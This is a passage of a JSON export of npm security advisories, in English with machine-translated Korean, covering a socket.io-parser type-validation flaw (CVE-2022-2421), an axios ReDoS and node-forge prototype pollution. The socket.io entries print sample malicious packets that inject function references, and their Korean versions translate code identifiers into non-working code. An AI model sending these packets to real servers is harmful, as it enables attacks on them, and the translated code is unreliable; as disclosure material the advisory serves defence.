([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | 예 :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | 예 :heavy_check_mark: |\n\n\n### `socket.io-client` 패키지에 대한 종속성 분석\n\n| `socket.io-client` 버전 | `socket.io-parser` 버전 | 덮여? |\n|-------------------------------------------|----- -------------------------------------------------- -------------------------------------------|------- -----------------------------|\n| `4.5.0...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | 예 :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | 아니요. 하지만 영향은 매우 제한적입니다. |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | 예 :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | 예 :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | 예 :heavy_check_mark: |"
  },
  {
    "description": "Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); // prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n // ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in `socket.io-parser@3.4.2`\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n",
    "identifiers": "GHSA : GHSA-qm95-pgcg-qqfq\nCVE : CVE-2022-2421",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T23:27:28Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2421\nhttps://csirt.divd.nl/cases/DIVD-2022-00045\nhttps://csirt.divd.nl/cves/CVE-2022-2421\nhttps://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4\nhttps://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050\nhttps://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14\nhttps://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983\nhttps://csirt.divd.nl/CVE-2022-2421\nhttps://csirt.divd.nl/DIVD-2022-00045\nhttps://github.com/advisories/GHSA-qm95-pgcg-qqfq",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.0.5",
    "identifier": "4.0.5",
    "descriptionKR": "`socket.io-parser` 라이브러리(`socket.io` 및 `socket.io-client` 패키지에서 Socket.IO 패킷을 인코딩 및 디코딩하는 데 사용됨)의 잘못된 유형 유효성 검사로 인해 덮어쓸 수 있습니다. 공격자가 결과 쿼리 개체의 임의 위치에 함수에 대한 참조를 배치할 수 있도록 하는 _placeholder 개체.\n\n예:\n\n```js\nconst 디코더 = new Decoder();\n\ndecoder.on(\"디코딩됨\", (패킷) => {\n console.log(패킷.데이터); // 출력 [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"세계\"));\n```\n\n이것은 `socket.io` 패키지에서 나타납니다:\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 여기서 \"val\"은 버퍼가 아닌 함수일 수 있습니다.\n });\n});\n```\n\n:경고: 중요 사항 :경고:\n\n클라이언트로부터 받은 페이로드가 실제로 `Buffer` 개체인지 확인해야 합니다.\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n 소켓.연결해제();\n 반품;\n }\n // ...\n });\n});\n```\n\n**이미 그런 경우라면 이 문제의 영향을 받지 않으며 공격자가 서버를 중단(또는 권한 상승 등)할 수 있는 방법이 없습니다.**\n\n악의적인 사용자가 보낼 수 있는 값의 예:\n\n- 범위를 벗어난 숫자\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- `undefined`와 같이 숫자가 아닌 값\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- \"push\"와 같이 `Array` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"푸시\" 함수에 대한 참조입니다.\n });\n});\n```\n\n- \"hasOwnProperty\"와 같이 `Object` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"hasOwnProperty\" 함수에 대한 참조입니다.\n });\n});\n```\n\n이것은 다음과 같이 수정해야 합니다.\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, `socket.io-parser@4.2.1`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, `socket.io-parser@4.0.5`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, `socket.io-parser@3.4.2`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, `socket.io-parser@3.3.3`에 포함됨\n\n### `socket.io` 패키지에 대한 종속성 분석\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 덮여? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | 예 :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | 예 :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | 예 :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | 예 :heavy_check_mark: |\n\n\n### `socket.io-client` 패키지에 대한 종속성 분석\n\n| `socket.io-client` 버전 | `socket.io-parser` 버전 | 덮여? |\n|-------------------------------------------|----- -------------------------------------------------- -------------------------------------------|------- -----------------------------|\n| `4.5.0...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | 예 :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | 아니요. 하지만 영향은 매우 제한적입니다. |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | 예 :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | 예 :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | 예 :heavy_check_mark: |"
  },
  {
    "description": "Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); // prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n // ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in `socket.io-parser@3.4.2`\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n",
    "identifiers": "GHSA : GHSA-qm95-pgcg-qqfq\nCVE : CVE-2022-2421",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T23:27:28Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2421\nhttps://csirt.divd.nl/cases/DIVD-2022-00045\nhttps://csirt.divd.nl/cves/CVE-2022-2421\nhttps://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4\nhttps://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050\nhttps://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14\nhttps://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983\nhttps://csirt.divd.nl/CVE-2022-2421\nhttps://csirt.divd.nl/DIVD-2022-00045\nhttps://github.com/advisories/GHSA-qm95-pgcg-qqfq",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.2.1",
    "identifier": "4.2.1",
    "descriptionKR": "`socket.io-parser` 라이브러리(`socket.io` 및 `socket.io-client` 패키지에서 Socket.IO 패킷을 인코딩 및 디코딩하는 데 사용됨)의 잘못된 유형 유효성 검사로 인해 덮어쓸 수 있습니다. 공격자가 결과 쿼리 개체의 임의 위치에 함수에 대한 참조를 배치할 수 있도록 하는 _placeholder 개체.\n\n예:\n\n```js\nconst 디코더 = new Decoder();\n\ndecoder.on(\"디코딩됨\", (패킷) => {\n console.log(패킷.데이터); // 출력 [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"세계\"));\n```\n\n이것은 `socket.io` 패키지에서 나타납니다:\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 여기서 \"val\"은 버퍼가 아닌 함수일 수 있습니다.\n });\n});\n```\n\n:경고: 중요 사항 :경고:\n\n클라이언트로부터 받은 페이로드가 실제로 `Buffer` 개체인지 확인해야 합니다.\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n 소켓.연결해제();\n 반품;\n }\n // ...\n });\n});\n```\n\n**이미 그런 경우라면 이 문제의 영향을 받지 않으며 공격자가 서버를 중단(또는 권한 상승 등)할 수 있는 방법이 없습니다.**\n\n악의적인 사용자가 보낼 수 있는 값의 예:\n\n- 범위를 벗어난 숫자\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- `undefined`와 같이 숫자가 아닌 값\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- \"push\"와 같이 `Array` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"푸시\" 함수에 대한 참조입니다.\n });\n});\n```\n\n- \"hasOwnProperty\"와 같이 `Object` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"hasOwnProperty\" 함수에 대한 참조입니다.\n });\n});\n```\n\n이것은 다음과 같이 수정해야 합니다.\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, `socket.io-parser@4.2.1`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, `socket.io-parser@4.0.5`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, `socket.io-parser@3.4.2`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, `socket.io-parser@3.3.3`에 포함됨\n\n### `socket.io` 패키지에 대한 종속성 분석\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 덮여? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | 예 :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | 예 :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | 예 :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | 예 :heavy_check_mark: |\n\n\n### `socket.io-client` 패키지에 대한 종속성 분석\n\n| `socket.io-client` 버전 | `socket.io-parser` 버전 | 덮여? |\n|-------------------------------------------|----- -------------------------------------------------- -------------------------------------------|------- -----------------------------|\n| `4.5.0...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | 예 :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | 아니요. 하지만 영향은 매우 제한적입니다. |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | 예 :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | 예 :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | 예 :heavy_check_mark: |"
  },
  {
    "description": "axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.",
    "identifiers": "GHSA : GHSA-cph5-m8f7-6c5x\nCVE : CVE-2021-3749",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T23:23:20Z",
    "publishedAt": "2021-09-01T18:23:02Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3749\nhttps://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929\nhttps://huntr.dev/bounties/1e8f07fc-c384-4ff9-8498-0690de2e8c31\nhttps://www.npmjs.com/package/axios\nhttps://lists.apache.org/thread.html/r075d464dce95cd13c03ff9384658edcccd5ab2983b82bfc72b62bb10@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/r216f0fd0a3833856d6a6a1fada488cadba45f447d87010024328ccf2@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/r3ae6d2654f92c5851bdb73b35e96b0e4e3da39f28ac7a1b15ae3aab8@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/r4bf1b32983f50be00f9752214c1b53738b621be1c2b0dbd68c7f2391@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/r7324ecc35b8027a51cb6ed629490fcd3b2d7cf01c424746ed5744bf1@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/r74d0b359408fff31f87445261f0ee13bdfcac7d66f6b8e846face321@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/ra15d63c54dc6474b29f72ae4324bcb03038758545b3ab800845de7a1@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/rc263bfc5b53afcb7e849605478d73f5556eb0c00d1f912084e407289@%3Ccommits.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/rfa094029c959da0f7c8cd7dc9c4e59d21b03457bf0cedf6c93e1bb0a@%3Cdev.druid.apache.org%3E\nhttps://lists.apache.org/thread.html/rfc5c478053ff808671aef170f3d9fc9d05cc1fab8fb64431edc66103@%3Ccommits.druid.apache.org%3E\nhttps://www.oracle.com/security-alerts/cpujul2022.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-cph5-m8f7-6c5x",
    "name": "axios",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.21.2",
    "identifier": "0.21.2",
    "descriptionKR": "v0.21.2 이전의 axios는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "The package node-forge before 0.10.0 is vulnerable to Prototype Pollution via the util.setPath function. Note: version 0.10.0 is a breaking change removing the vulnerable functions.",
    "identifiers": "GHSA : GHSA-92xj-mqp7-vmcj\nCVE : CVE-2020-7720",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T22:48:50Z",
    "publishedAt": "2020-09-14T21:42:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7720\nhttps://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md\nhttps://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md#removed\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293\nhttps://snyk.io/vuln/SNYK-JS-NODEFORGE-598677\nhttps://github.com/digitalbazaar/forge/commit/6a1e3ef74f6eb345bcff1b82184201d1e28b6756\nhttps://github.com/advisories/GHSA-92xj-mqp7-vmcj",
    "name": "node-forge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.10.0",
    "identifier": "0.10.0",
    "descriptionKR": "0.10.0 이전의 패키지 node-forge는 util.setPath 함수를 통한 Prototype Pollution에 취약합니다. 참고: 버전 0.10.0은 취약한 기능을 제거하는 브레이킹 체인지입니다."
  },
  {
